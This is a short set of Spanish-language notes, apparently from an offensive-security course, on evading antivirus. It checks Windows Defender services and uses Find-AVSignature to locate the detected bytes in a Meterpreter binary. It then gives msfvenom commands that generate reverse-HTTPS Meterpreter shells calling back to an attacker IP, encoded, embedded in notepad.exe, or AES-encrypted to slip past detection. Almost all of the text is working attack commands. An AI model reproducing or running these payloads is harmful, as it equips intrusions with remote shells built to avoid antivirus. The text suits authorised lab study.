#### Windows Defender
##### Verificar que se esta ejecutando
```
powershell -c "Get-Service -Name windefend"
sc query windefend
```
 
 ##### Verificar proteccion de firewall
```
powershell -c "Get-Service -Name mpssvc"
sc query mpssvc
```

----

Instalacion de AV avira y ClamAV
Modulo Find-AVSignature.ps1

#### Localización de firmas en archivos
```
Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force
Find-AVSignature -StartByte 18000 -EndByte 19000 -Interval 100 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest3 -Verbose -Force
Find-AVSignature -StartByte 18800 -EndByte 18900 -Interval 10 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest4 -Verbose -Force
```

#### Metasploit encoders
```
msfvenom --list encoders
sudo msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.100.9 LPORT=443 -e x86/shikata_ga_nai -f exe -o met.exe
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.9 LPORT=443 -f exe -o /var/www/html/met64.exe
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.9 LPORT=443 -e x64/zutto_dekiru -f exe -o met64_zutto.exe
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.9 LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o met64_notepad.exe
```

#### Cifradores Metasploit
```
msfvenom --list encrypt
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o met64_aes.exe
```
